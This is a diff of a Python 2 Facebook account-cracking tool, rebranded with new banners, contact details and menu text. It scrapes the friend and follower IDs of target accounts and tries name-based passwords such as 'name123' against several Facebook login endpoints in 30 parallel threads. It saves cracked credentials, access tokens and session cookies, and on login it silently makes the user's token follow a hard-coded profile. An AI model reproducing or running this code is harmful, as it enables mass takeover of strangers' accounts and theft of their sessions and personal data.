@@ -1,5 +1,5 @@
 # -*- coding: utf-8
-# author by Mark Cornel
+# author by FUEGO X RAJUL
 import os
 try:
 	import requests
@@ -53,17 +53,18 @@ bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "0
 
 def logo():
 	os.system("clear")
-	print("""\x1b[0;32m╔════════════════════════════════════════════╗
-\x1b[0;33m║WELCOME TO MAFIA UNDERGROUND TOOL [RAJUL].  ║
-\x1b[0;33m║       #TOOL AUTHOR [F•U•E•G•O] MAFIA BOSS. ║
-\x1b[0;33m╚════════════════════════════════════════════╝
-\x1b[0;33m ---------------------------------------------
-\x1b[0;33m╔════════════════════════════════════════════╗
-\x1b[0;33m║#YOUTUBE : https://youtube.com/SocialTech.  ║
-\x1b[0;33m║#FACEBOOK : NAME [AMAHLE DUNSON II ].       ║
-\x1b[0;33m║#GITHUB : https://github.com/MAFIA-FUEGO.   ║
-\x1b[0;33m║#WHATSAPP : +27768432399.                   ║
-\x1b[0;33m╚════════════════════════════════════════════╝""")
+	print("""\033[1;97m             
+███████╗██╗   ██╗███████╗ ██████╗  ██████╗ 
+██╔════╝██║   ██║██╔════╝██╔════╝ ██╔═══██╗
+█████╗  ██║   ██║█████╗  ██║  ███╗██║   ██║
+██╔══╝  ██║   ██║██╔══╝  ██║   ██║██║   ██║
+██║     ╚██████╔╝███████╗╚██████╔╝╚██████╔╝
+╚═╝      ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝  \033[1;0m
+\033[1;97m--------------------------------------------------
+\033[1;93m➤\033[1;97m Author   : FUEGO-X-RAJUL
+\033[1;93m➤\033[1;97m Github   : https://github.com/Annonymos
+\033[1;93m➤\033[1;97m Whatsapp : +27768432399
+\033[1;97m--------------------------------------------------""")
 def login():
 	os.system("clear")
 	try:
@@ -82,7 +83,7 @@ def login():
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
 			#-> bot follow
-			requests.post("https://graph.facebook.com/4/subscribers?access_token="+token)      # Dapunta Khurayra X
+			requests.post("https://graph.facebook.com/princess.lubisi.7/subscribers?access_token="+token)      #FUEGO X RAJUL
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
@@ -105,13 +106,13 @@ def menu():
 		exit(" ! no internet connection")
 	logo()
 	
-	print("\n\033[1;93m[\033[1;94m01\033[1;97m] CRACK ID FROM PUBLIC FRIENDS")
-	print("\033[1;93m[\033[1;94m02\033[1;97m] CRACK ID FROM PUBLICK FOLLOWERS")
-	print("\033[1;93m[\033[1;94m03\033[1;97m] MULTIPLE-ID's CRACK\033[1;93m [ \033[1;95mPRO \033[1;97m]")
-	print("\033[1;93m[\033[1;94m04\033[1;97m] Chack Crack Results")
-	print("\033[1;93m[\033[1;94m05\033[1;97m] USER-AGENT SETTINGS\033[1;97m [ \033[1;95mPRO \033[1;97m]")
-	print("\033[1;93m[\033[1;94m00\033[1;97m] Exit\033[1;97m [ \033[1;91mDELETE TOKEN \033[1;97m]")
-	Bilal = raw_input("\n\033[1;96m[\033[1;93m+\033[1;96m] CHOOSE : ")
+	print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97m Clone from public friends")
+	print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97m Crack from public followers")
+	print("\033[1;97m[3]\033[1;91m-⋄-\033[1;97m Multi cracking from public Id\033[1;93m [ \033[1;95mPro \033[1;97m]")
+	print("\033[1;97m[4]\033[1;91m-⋄-\033[1;97m Check crack results")
+	print("\033[1;97m[5]\033[1;91m-⋄-\033[1;97m User-agent settings \033[1;97m [ \033[1;95mPRO \033[1;97m]")
+	print("\033[1;97m[6]\033[1;91m-⋄-\033[1;97m Exit\033[1;97m [ \033[1;91m remove-token\033[1;97m]")
+	Bilal = raw_input("\033[1;97m[+]\033[1;91m-⋄-\033[1;97mOption : ")
 	if Bilal =="":
 		menu()
 	elif Bilal == "1" or Bilal == "01":
@@ -124,18 +125,18 @@ def menu():
 		massal()
 		method()
 	elif Bilal == "4" or Bilal == "04":
-		print("\n\033[1;92m[\033[1;93m01\033[1;96m] CHECK CRACK RESULTS OK")
-		print("\033[1;93m[\033[1;94m02\033[1;96m] CHECK RESULTS CP")
-		cek = raw_input("\n\033[1;93m[\033[1;93m+\033[1;96m] CHOOSE : ")
+		print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97m Check results OK")
+		print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97m Check results CP")
+		cek = raw_input("\033[1;97m[+]\033[1;91m-⋄-\033[1;97m Option : ")
 		if cek =="":
 			menu()
 		elif cek == "1":
 			dirs = os.listdir("OK")
-			print("\033[1;96m[\033[1;93m+\033[1;96m] Copy File Name  And Past into Input")
+			print("\033[1;96m[\033[1;93m+\033[1;96m] Copy file name  and past into input")
 			for file in dirs:
 				print("[•]  "+file)
 			try:
-				file = raw_input("\n\033[1;96m[\033[1;93m+\033[1;96m] File Name : ")
+				file = raw_input("\n\033[1;96m[\033[1;93m+\033[1;96m] file name : ")
 				if file == "":
 					menu()
 				Totalok = open("OK/%s"%(file)).read().splitlines()
@@ -163,7 +164,7 @@ def menu():
 			nm_file = ("%s"%(file)).replace("-", " ")
 			del_txt = nm_file.replace(".txt", "")
 			print("# ----------------------------------------------")
-			print(" CRACK RESULTS : %s TOTAL : %s\033[0;93m"%(del_txt, len(Totalcp)))
+			print(" Crack results : %s total : %s\033[0;93m"%(del_txt, len(Totalcp)))
 			os.system("cat CP/%s"%(file))
 			print("\033[0;96m # ----------------------------------------------")
 			exit(" ")
@@ -173,7 +174,7 @@ def menu():
 		setting_ua()
 	elif Bilal == "0" or Bilal == "00":
 		os.system("rm -f login.txt")
-		exit("\n\033[1;96m[\033[1;93m!\033[1;96m] Token Removed")
+		exit("\033[1;97m token Removed")
 	else:
 		menu()
 
@@ -183,15 +184,15 @@ def publik():
 		token = open("login.txt", "r").read()
 	except IOError:
 		exit("\n\033[1;96m[\033[1;93m!\033[1;96m] Token Error")
-	idt = raw_input("\n\033[1;96m[\033[1;94m+\033[1;96m] Target Id: ")
+	idt = raw_input("\033[1;93m➤\033[1;97m Target Id: ")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 			uid = i["id"]
 			nama = i["name"].rsplit(" ")[0]
 			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit("\n\033[1;96m[\033[1;94m+\033[1;96m] Account Friend List is Not Public")
-	print("\033[1;96m[\033[1;94m+\033[1;96m] Total id  : \033[0;91m%s\033[0;97m"%(len(id))) 
+		exit("\033[1;93m➤\033[1;97m Account friend list is not public")
+	print("\\033[1;93m➤\033[1;97m  Total id  : \033[0;91m%s\033[0;97m"%(len(id))) 
 
 def follower():
 	global token
@@ -199,7 +200,7 @@ def follower():
 		token = open("login.txt", "r").read()
 	except IOError:
 		exit("\n\033[1;96m[\033[1;94m+\033[1;96m] Token Error")
-	idt = raw_input("\n\033[1;96m[\033[1;94m+\033[1;96m] TARGET ID : ")
+	idt = raw_input("\033[1;93m➤\033[1;97m Target ID : ")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
 			uid = i["id"]
@@ -216,44 +217,44 @@ def massal():
 	except IOError:
 		exit("\033[1;96m[\033[1;94m+\033[1;96m] Token Error")
 	try:
-		tanya_Total = int(input("\033[1;96m[\033[1;94m+\033[1;96m] ENTER OPTION ID'S [HOW MANY] : "))
+		tanya_Total = int(input("\033[1;93m➤\033[1;97m Enter Multiple ID Option  : "))
 	except:tanya_Total=1
 	for t in range(tanya_Total):
 		t +=1
-		idt = raw_input("\033[1;96m[\033[1;94m+\033[1;97m] TARGET ID %s : "%(t))
+		idt = raw_input("\033[1;93m➤\033[1;97m Target ID %s : "%(t))
 		try:
 			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 				uid = i["id"]
 				nama = i["name"].rsplit(" ")[0]
 				id.append(uid+"<=>"+nama)
 		except KeyError:
-			print("\033[1;96m[\033[1;94m+\033[1;97m] Ids Friend list Is Not Public")
-	print("\033[1;96m[\033[1;94m?\033[1;97m] Total id  : \033[0;92m%s\033[0;96m"%(len(id)))
+			print("\033[1;93m➤\033[1;97m  Ids friend list Is not public")
+	print("\033[1;93m➤\033[1;97m Total id  : \033[0;92m%s\033[0;96m"%(len(id)))
 
 def method():
-	print("\n\033[1;93m[\033[1;94m?\033[1;97m] CHOOSE CRACKING MATHORD")
-	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mMAFIA PRO/FASTER \033[1;97m]")
-	print("\033[1;93m[\033[1;94m2\033[1;97m] MBASIC\033[1;93m [ \033[1;95mFAST \033[1;97m]")
-	print("\033[1;93m[\033[1;94m3\033[1;97m] FREE FACEBOOK\033[1;93m [ \033[1;95mNORMAL\033[1;97m]")
-	method = raw_input("\033[1;93m[\033[1;94m?\033[1;97m] CHOOSE : ")
+	print("\033[1;93m➤\033[1;97m Choose crack methord [recommended B-API]")
+	print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mB-API\033[1;97m [ \033[1;95mFaster \033[1;97m]")
+	print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97m] M-basic\033[1;93m [ \033[1;95mFast \033[1;97m]")
+	print("\033[1;97m[3]\033[1;91m-⋄-\033[1;97m Free facebook\033[1;93m [ \033[1;95m normal\033[1;97m]")
+	method = raw_input("\033[1;93m➤\033[1;97m Option : ")
 	if method == "":
 		menu()
 	elif method == "1":
-		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] DO YOU CHOOSE MANUAL PASSWORD y/t\033[1;97m [ \033[1;96mDefault : t \033[1;97m] : ")
+		ask = raw_input("\033[1;93m➤\033[1;97m  Do you choose manual passwors ? y/t\033[1;97m [ \033[1;92mDefault : t \033[1;97m] : ")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(bapi, id)
 		exit("Program End")
 	elif method == "2":
-		ask = raw_input("\033[1;96m[\033[1;94m03\033[1;97m] DO YOU CHOOSE MANUAL PASSWORD y/t\033[1;97m [ \033[1;96mDefault : t \033[1;97m] ")
+		ask = raw_input("\033[1;93m➤\033[1;97m Do you choose manual passwords  y/t\033[1;97m [ \033[1;92mDefault : t \033[1;97m] ")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(mbasic, id)
 		exit("Program End")
 	elif method == "3":
-		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] DO YOU CHOOSE MANUAL PASSWORD y/t\033[1;97m [ \033[1;96mDefault : t \033[1;97m] ")
+		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] Do you choose manual passwords y/t\033[1;97m [ \033[1;92mDefault : t \033[1;97m] ")
 		if ask == "y":
 			manual()
 		print(" ")
@@ -269,7 +270,7 @@ def cek_ttl_cp(uid, pw):
 			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 			month, day, year = ttl.split("/")
 			month = bulan_ttl[month]
-			print("\r\033[0;95m[FUEGO-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
+			print("\r\033[0;91m[FUEGO-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
 			cp.append("%s|%s"%(uid, pw))
 			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 	except KeyError, IOError:
@@ -285,17 +286,17 @@ def bapi(user):
 		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 	global loop, token
 	sys.stdout.write(
-		"\r\033[0;91m[\033[0;92mCracking\033[0;91m]\033[0;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
+		"\r\033[1;93m➤\033[1;97m Cracking\033[1;91m]\033[1;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [ name, name+"123", name+"1234", name+"12345" ]
+		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=2:
-		pwx = [ name+"123", name+"1234", name+"12345" ]
+		pwx = [ name+"3", name+"33", name+"333", name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=3:
-		pwx = [ name+"123", name+"12345" ]
+		pwx = [ name+"11", name+"111", name+"123", name+"12345" ]
 	else:
-		pwx = [ name+"123", name+"12345" ]
+		pwx = [ name+"2", name+"22", name+"22", name+"123", name+"12345" ]
 	try:
 		for pw in pwx:
 			pw = pw.lower()
@@ -303,13 +304,13 @@ def bapi(user):
 			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
 			if "session_key" in send.text and "EAAA" in send.text:
-				print("\r\033[0;94m[MARK-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[0;95m[FUEGO-CP] %s|%s\033[0;92m        "%(uid, pw))
+				print("\r\033[0;91m[FUEGO-CP] %s|%s\033[0;92m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -355,13 +356,13 @@ def mbasic(user):
 			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[0;94m[MARK-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
+				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;95m[MARK-CP] %s|%s\033[0;96m        "%(uid, pw))
+				print("\r\033[0;91m[FUEGO-CP] %s|%s\033[0;96m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -407,13 +408,13 @@ def mobile(user):
 			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[0;94m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;95m[FUEGO-CP] %s|%s\033[0;91m        "%(uid, pw))
+				print("\r\033[0;91m[FUEGO-CP] %s|%s\033[0;91m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -459,13 +460,13 @@ def manual():
 				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 				if "c_user" in ses.cookies.get_dict().keys():
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r\033[0;94m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+					print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 					ok.append("%s|%s"%(uid, pw))
 					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
 					continue
 				elif "checkpoint" in ses.cookies.get_dict().keys():
-					print("\r\033[0;95m[FUEGO-CP] %s|%s\033[0;91m        "%(uid, pw))
+					print("\r\033[0;91m[FUEGO-CP] %s|%s\033[0;91m        "%(uid, pw))
 					cp.append("%s|%s"%(uid, pw))
 					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
